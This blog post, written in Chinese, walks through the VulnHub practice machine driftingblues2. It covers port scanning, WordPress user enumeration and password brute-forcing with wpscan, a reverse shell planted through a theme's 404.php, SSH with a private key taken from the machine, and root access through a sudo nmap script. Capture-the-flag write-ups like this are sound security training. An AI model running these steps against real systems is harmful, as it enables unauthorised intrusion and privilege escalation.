---
title: driftingblues2 VulnHub Walkthrough
date: 2021-10-12 16:31:08
categories:
- 渗透测试
tags:
- VulnHub
---

### 信息收集

#### 主机探测

```
arp-scan -l
```

![](https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png)

#### 端口扫描

```
nmap -sC -sV -p- 192.168.62.171
```

![](https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png)

开放端口：21(ftp)、22(ssh)、80(http)

可以匿名访问ftp服务，有一张图片，应该有隐藏的信息

![](https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png)

<img src="https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg" style="zoom: 25%;" />

图片先放着，访问80端口没什么东西，扫一下目录

```
dirsearch -u http://192.168.62.171/
```

![](https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png)

有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下

![](https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png)

![](https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png)

用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名

```
wpscan --url http://driftingblues.box/blog/ -e u
```

![](https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png)

再通过获取到的用户名albert，试试爆破密码

```
wpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt
```

![](https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png)

稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码`albert:scotland1`登录后台

![](https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png)

### Get Shell

通过修改主题的404.php来反弹shell

![](https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png)

修改后先开启一个监听端口来接受shell

![](https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png)

访问404.php成功反弹shell

![](https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png)

![](https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png)

靶机有python环境，可以获取一个交互式的shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png)

进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录

![](https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png)

```
ssh freddie@192.168.62.171 -i id_rsa
```

![](https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png)

得到第一个flag

<img src="https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png" style="zoom: 67%;" />

### 提权

![](https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png)

可以看出来，接下来需要用nmap提权

```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```

![](https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png)

执行完获得root权限，但此时是看不到输入的，接着执行

```
reset
```

这时就可以获取第二个flag了

<img src="https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png" style="zoom:67%;" />

所以，一开始获取的图片还是没用上

